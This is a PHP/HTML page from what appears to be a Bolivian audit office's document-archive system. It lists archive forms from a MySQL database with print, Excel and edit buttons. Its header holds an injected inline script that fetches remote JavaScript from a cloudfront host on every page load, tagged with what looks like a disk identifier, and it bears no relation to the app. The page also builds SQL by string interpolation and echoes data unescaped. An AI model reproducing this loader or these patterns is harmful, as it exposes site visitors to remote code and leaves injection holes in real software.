<?php include("cabf.php");?>
<?php include("inc.config.php");?>
<?php

date_default_timezone_set('America/La_Paz');
$fecha_ram			= date("Ymd");
$fecha 					= date("Y-m-d");

$idusuario_ss  =  $_SESSION['idusuario_ss'];
$idnombre_ss   =  $_SESSION['idnombre_ss'];
$perfil_ss     =  $_SESSION['perfil_ss'];

$sqlh = "  SELECT idcorres, gestion, correlativo, idusuario, no_control ";
$sqlh.= "  FROM corres WHERE origen= 'INTERNA' ORDER BY idcorres DESC LIMIT 1";
$resulth = mysqli_query($link,$sqlh);
$rowh = mysqli_fetch_array($resulth);

$nuevo= $rowh[2]+1;

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SUBCONTRALORIA EMPRESAS PUBLICAS</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="" />
<meta name="author" content="http://webthemez.com" />
<!-- c+ss -->
<link href="css/bootstrap.min.css" rel="stylesheet" />
<link href="css/fancybox/jquery.fancybox.css" rel="stylesheet">
<link href="css/flexslider.css" rel="stylesheet" />
<link href="css/style.css" rel="stylesheet" />

<link rel="stylesheet" href="css/jquery-ui.min.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/dataTables.bootstrap.min.css">

<!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

</head>
<body>
<div id="wrapper">
<div class="topbar">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
         <p class="pull-left hidden-xs">CONTRALORIA GENERAL DEL ESTADO</p>
         <p class="pull-right"><i class="fa fa-user"></i>
        <?php
$sqlus =" SELECT nombres, paterno, materno FROM nombres WHERE idnombre='$idnombre_ss'";
$resultus = mysqli_query($link,$sqlus);
$rowus = mysqli_fetch_array($resultus);?>
        <?php echo $rowus[0];?> <?php echo $rowus[1];?> <?php echo $rowus[2];?></p>
      </div>
    </div>
  </div>
</div>
	<!-- start header -->
	<header>
        <div class="navbar navbar-default navbar-static-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                  <a class="navbar-brand" href="inicio.php"><img src="img/logo.png" alt="logo"/></a>
                </div>
                <?php include("menu_corres.php");?>
            </div>
        </div>

<script language="javascript" src="js/jquery-3.1.1.min.js"></script>

<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.119#p=hitachixhds721032cla362_jpb440hf09xskm09xskmx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>

	</header><!-- end header -->
	<section id="inner-headline">
	<div class="container">
		<div class="row">
			<div class="col-lg-12">
				<h2 class="pageTitle">GESTIÓN DE ARCHIVO</h2>
			</div>
		</div>
	</div>
	</section>
	<section id="content">

	<div class="container">
		<div class="row">
		<div class="tg-main-section tg-banner tg-haslayout parallax-window" data-parallax="scroll" data-bleed="100" data-speed="0.2" data-image-src="images/slider/img-03.jpg">
		</div>
   	<div class="about-logo">
      <h3 align="center"> </h3>
       <p>EN ESTA SECCION SE REALIZA LA GESTION DOCUMENTAL DE ARCHIVO DE LA SCEP.</p>
    </div>
    </div>
    <div class="row">
        <form name="FORMU" action="nuevo_formulario_arch.php" method="post">
        <button type="submit" class="btn btn-primary">NUEVO FORMULARIO</button>
        </form>
    </div>

<div class="container">
<div class="row">
<div class="col-lg-12">
<h3>FORMULARIOS DE ARCHIVO</h3>
</div>
</div>
<!--- gestion de usuarios ---->

<div class="table-responsive">
      <table class="table table-bordered" id="example" width="100%" cellspacing="0">
					<thead>
						<tr>
							<th>Nª</th>
              <th>CÓDIGO</th>
							<th>ENTIDAD/EMPRESA</th>
							<th>USUARIO</th>
							<th>FORMULARIO</th>
							<th>FORMULARIO EXCEL</th>
							<th>VER/EDITAR</th>
						</tr>
					</thead>
					<tbody>
    <?php
    $numero=1;
    $sql =" SELECT form_archivo.idform_archivo, empresa.razon_social, form_archivo.idusuario, form_archivo.fecha_form, form_archivo.codigo, form_archivo.idempresa  ";
    $sql.=" FROM form_archivo, empresa WHERE form_archivo.idempresa=empresa.idempresa ORDER BY form_archivo.idform_archivo  ";
    $result = mysqli_query($link,$sql);
    if ($row = mysqli_fetch_array($result)){
    mysqli_field_seek($result,0);
    while ($field = mysqli_fetch_field($result)){
    } do {
    ?>
					<tr>
						<td><?php echo $numero;?></td>
            <td><?php echo $row[4];?></td>
						<td><?php echo $row[1];?></td>
						<td>  
            <?php   
            $sql4 = " SELECT nombres.nombres, nombres.paterno, nombres.materno, cargo.cargo ";
            $sql4.= " FROM usuarios, nombres, cargo WHERE usuarios.idnombre=nombres.idnombre ";
            $sql4.= " AND usuarios.idcargo=cargo.idcargo ";
            $sql4.= " AND usuarios.idusuario='$row[2]' ";
            $result4 = mysqli_query($link,$sql4);
            $row4 = mysqli_fetch_array($result4);
            ?>  
            <?php echo $row4[0];?> <?php echo $row4[1];?> <?php echo $row4[2];?> </br><?php echo $row4[3];?></td>
						<td>
            <a href="imprime_formulario_arch.php?idform_archivo=<?php echo $row[0];?>&idusuario_arch=<?php echo $row[2];?>&codigo_form=<?php echo $row[4];?>" target="_blank" class="Estilo5" onClick="window.open(this.href, this.target, 'width=1100,height=800,scrollbars=YES,left=200'); return false;">IMPRIMIR FORMULARIO DE ARCHIVO</a>  
            </td>
						<td> 

            <form name="FORM_ARCH" action="reporte_formulario_arch.php" method="post">
<input name="idform_archivo" type="hidden" value="<?php echo $row[0];?>">
<input name="idusuario_arch" type="hidden" value="<?php echo $row[2];?>">
<input name="codigo_form" type="hidden" value="<?php echo $row[4];?>">
<div class="col-md-3"><button type="submit" class="btn-link"><h5 class="text-muted">GENERAR EXCEL</h5></button>
</form>

            </td>
						<td>                                                
						<form name="VALIDA" action="valida_form_archivo.php" method="post">
						<input name="idform_archivo" type="hidden" value="<?php echo $row[0];?>">
            <input name="idempresa" type="hidden" value="<?php echo $row[5];?>">
						<input name="idusuario_arch" type="hidden" value="<?php echo $row[2];?>">
            <input name="codigo_form" type="hidden" value="<?php echo $row[4];?>">
						<button type="submit" class="btn btn-primary">VER/EDITAR</button></form>
						</td>
					</tr>  
<?php
$numero=$numero+1;  
}
  while ($row = mysqli_fetch_array($result));
} else {
}
?>
                                    </tbody>
                                </table>
                            </div>

<!--- gestion de usuarios ---->

</div>
</br>
  </section>
	<footer>
	<?php include("footer.php");?>
	</footer>
</div>
<a href="#" class="scrollup"><i class="fa fa-angle-up active"></i></a>
<!-- javascript
    ================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="js/jquery.js"></script>
<script src="js/jquery.easing.1.3.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.fancybox.pack.js"></script>
<script src="js/jquery.fancybox-media.js"></script>
<script src="js/jquery.flexslider.js"></script>
<script src="js/animate.js"></script>
<!-- Vendor Scripts -->
<script src="js/modernizr.custom.js"></script>
<script src="js/jquery.isotope.min.js"></script>
<script src="js/jquery.magnific-popup.min.js"></script>
<script src="js/animate.js"></script>
<script src="js/custom.js"></script>
<script src="contact/jqBootstrapValidation.js"></script>
<script src="contact/contact_me.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/script.js"></script>
<script src="js/dataTables.bootstrap.min.js"></script>
</body>
</html>